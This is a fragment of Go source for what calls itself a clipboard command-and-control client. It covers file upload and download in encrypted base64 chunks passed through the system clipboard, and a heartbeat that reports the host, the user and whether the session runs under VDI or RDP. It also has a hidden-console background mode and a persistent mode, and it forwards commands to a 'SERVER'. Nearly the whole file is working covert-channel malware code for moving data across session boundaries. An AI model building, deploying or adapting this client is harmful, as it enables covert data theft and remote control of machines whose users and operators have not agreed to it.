			end = len(fileData)
		}

		chunk := fileData[start:end]
		encodedChunk := base64.StdEncoding.EncodeToString(chunk)

		chunkMsg := Message{
			ID:          fmt.Sprintf("%s-%d-%d", c.channel.nodeID, time.Now().Unix(), i),
			Type:        MSG_FILE_CHUNK,
			From:        c.channel.nodeID,
			To:          "SERVER",
			Payload:     encodedChunk,
			FileID:      fileID,
			FileName:    filepath.Base(remotePath),
			FileSize:    fileInfo.Size(),
			ChunkNum:    i,
			TotalChunks: totalChunks,
		}

		jsonData, _ := json.Marshal(chunkMsg)
		encrypted, _ := c.channel.encrypt(jsonData)
		clipboardData := PROTOCOL_PREFIX + encrypted
		c.channel.setClipboard(clipboardData)

		time.Sleep(300 * time.Millisecond)

		if c.channel.debug && (i+1)%10 == 0 {
			progress := float64(i+1) / float64(totalChunks) * 100
			log.Printf("[%s] Upload progress: %.1f%% (%d/%d)", c.channel.nodeID, progress, i+1, totalChunks)
		}
	}

	log.Printf("[%s] File upload complete: %s", c.channel.nodeID, remotePath)
	c.channel.SendMessage(MSG_RESPONSE, "SERVER",
		fmt.Sprintf("File transfer complete: %s", filepath.Base(remotePath)))
}

func (c *Client) handleFileChunk(msg *Message) {
	if msg.FileID == "" {
		return
	}

	transfer, exists := c.fileTransfers[msg.FileID]
	if !exists {
		transfer = &FileTransfer{
			ID:          msg.FileID,
			FileName:    msg.FileName,
			TotalSize:   msg.FileSize,
			Chunks:      make(map[int][]byte),
			TotalChunks: msg.TotalChunks,
			StartTime:   time.Now(),
			Direction:   "upload",
		}
		c.fileTransfers[msg.FileID] = transfer

		log.Printf("[%s] Starting file upload: %s (%d bytes, %d chunks)",
			c.channel.nodeID, msg.FileName, msg.FileSize, msg.TotalChunks)
	}

	chunkData, err := base64.StdEncoding.DecodeString(msg.Payload)
	if err != nil {
		log.Printf("[%s] Error decoding chunk %d: %v", c.channel.nodeID, msg.ChunkNum, err)
		return
	}

	transfer.Chunks[msg.ChunkNum] = chunkData
	transfer.Received++

	if c.channel.debug {
		progress := float64(transfer.Received) / float64(transfer.TotalChunks) * 100
		log.Printf("[%s] Receive progress: %.1f%% (%d/%d chunks)",
			c.channel.nodeID, progress, transfer.Received, transfer.TotalChunks)
	}

	if transfer.Received == transfer.TotalChunks {
		c.completeFileUpload(transfer)
	}
}

func (c *Client) completeFileUpload(transfer *FileTransfer) {
	var fileData []byte
	for i := 0; i < transfer.TotalChunks; i++ {
		chunk, exists := transfer.Chunks[i]
		if !exists {
			errorMsg := fmt.Sprintf("Missing chunk %d for file %s", i, transfer.FileName)
			c.channel.SendMessage(MSG_FILE_ERROR, "SERVER", errorMsg)
			return
		}
		fileData = append(fileData, chunk...)
	}

	targetDir := filepath.Dir(transfer.FileName)
	if targetDir != "." && targetDir != "" {
		err := os.MkdirAll(targetDir, 0755)
		if err != nil {
			errorMsg := fmt.Sprintf("Failed to create directory %s: %v", targetDir, err)
			c.channel.SendMessage(MSG_FILE_ERROR, "SERVER", errorMsg)
			return
		}
	}

	err := os.WriteFile(transfer.FileName, fileData, 0644)
	if err != nil {
		errorMsg := fmt.Sprintf("Failed to save file %s: %v", transfer.FileName, err)
		c.channel.SendMessage(MSG_FILE_ERROR, "SERVER", errorMsg)
		return
	}

	duration := time.Since(transfer.StartTime)
	log.Printf("[%s] File upload complete: %s (%d bytes in %v)",
		c.channel.nodeID, transfer.FileName, len(fileData), duration)

	c.channel.SendMessage(MSG_FILE_COMPLETE, "SERVER",
		fmt.Sprintf("File saved: %s (%d bytes in %v)", transfer.FileName, len(fileData), duration))

	delete(c.fileTransfers, transfer.ID)
}

func (c *Client) startHeartbeat() {
	if c.heartbeatTicker != nil {
		c.heartbeatTicker.Stop()
	}

	c.heartbeatTicker = time.NewTicker(c.channel.heartbeatInterval)
	go func() {
		for {
			select {
			case <-c.heartbeatTicker.C:
				if !c.sleeping || time.Now().After(c.sleepUntil) {
					if c.sleeping {
						c.sleeping = false
						c.sleepUntil = time.Time{}
						log.Printf("[%s] Auto-woke from sleep timeout", c.channel.nodeID)
					}
					c.channel.SendMessage(MSG_HEARTBEAT, "SERVER", "alive")
				}
			}
		}
	}()
}

func (c *Client) SendCommand(command string) error {
	return c.channel.SendMessage(MSG_COMMAND, "SERVER", command)
}

func (c *Client) SendData(data string) error {
	return c.channel.SendMessage(MSG_DATA, "SERVER", data)
}

func (c *Client) Start() {
	log.Printf("[%s] Starting enhanced client...", c.channel.nodeID)
	log.Printf("[%s] Environment: %s", c.channel.nodeID, c.environment.SessionType)
	log.Printf("[%s] VDI: %v, RDP: %v, Physical: %v", c.channel.nodeID,
		c.environment.IsVDI, c.environment.IsRDP, c.environment.IsPhysical)
	log.Printf("[%s] User: %s@%s", c.channel.nodeID,
		c.environment.Username, c.environment.ComputerName)

	hostname, _ := os.Hostname()
	info := fmt.Sprintf("Enhanced client online - Host: %s, PID: %d, Environment: %s, User: %s, Heartbeat: %v",
		hostname, os.Getpid(), c.environment.SessionType, c.environment.Username, c.channel.heartbeatInterval)
	c.channel.SendMessage(MSG_HEARTBEAT, "SERVER", info)

	c.startHeartbeat()
	c.channel.StartMonitoring()
}

func main() {
	var (
		clientID   = flag.String("id", "", "Client ID (required)")
		password   = flag.String("password", "research123", "Shared password")
		command    = flag.String("cmd", "", "Single command to execute and exit")
		data       = flag.String("data", "", "Data to send to server")
		debug      = flag.Bool("debug", false, "Enable debug logging")
		heartbeat  = flag.Duration("heartbeat", DEFAULT_HEARTBEAT, "Heartbeat interval")
		background = flag.Bool("background", false, "Start in background mode (hidden)")
		persistent = flag.Bool("persistent", false, "Enable persistent background mode")
	)
	flag.Parse()

	if *clientID == "" {
		fmt.Println("Error: Client ID is required")
		fmt.Println("Usage: client.exe -id=CLIENT1 [options]")
		flag.PrintDefaults()
		os.Exit(1)
	}

	if *heartbeat < MIN_HEARTBEAT || *heartbeat > MAX_HEARTBEAT {
		log.Fatalf("Heartbeat interval must be between %v and %v", MIN_HEARTBEAT, MAX_HEARTBEAT)
	}

	if *background || *persistent {
		hideConsoleWindow()
	}

	fmt.Println("=== COMPLETE ENHANCED CLIPBOARD C2 CLIENT ===")
	fmt.Println("")
	fmt.Printf("Client ID: %s\n", *clientID)
	fmt.Printf("Protocol: %s\n", PROTOCOL_PREFIX)
	fmt.Printf("Heartbeat: %v\n", *heartbeat)
	if *background || *persistent {
		fmt.Printf("Background Mode: %v\n", true)
	}
	fmt.Println("===========================================")

	client, err := NewClient(*clientID, *password, *heartbeat, *debug)
	if err != nil {
		log.Fatal(err)
	}

	if *persistent {
		client.persistent = true
	}

	client.Start()

	if *command != "" {
		time.Sleep(2 * time.Second)
		log.Printf("Executing single command: %s", *command)
		client.SendCommand(*command)
		time.Sleep(5 * time.Second)
		return
	}

	if *data != "" {
		time.Sleep(2 * time.Second)
		log.Printf("Sending data: %s", *data)
		client.SendData(*data)
		time.Sleep(5 * time.Second)
		return
	}

	if *background || *persistent {
		log.Printf("[%s] Running in background mode. Use server to control.", *clientID)
	} else {
		log.Printf("[%s] Running in persistent mode. Press Ctrl+C to exit.", *clientID)
	}

	select {} // Block forever
}
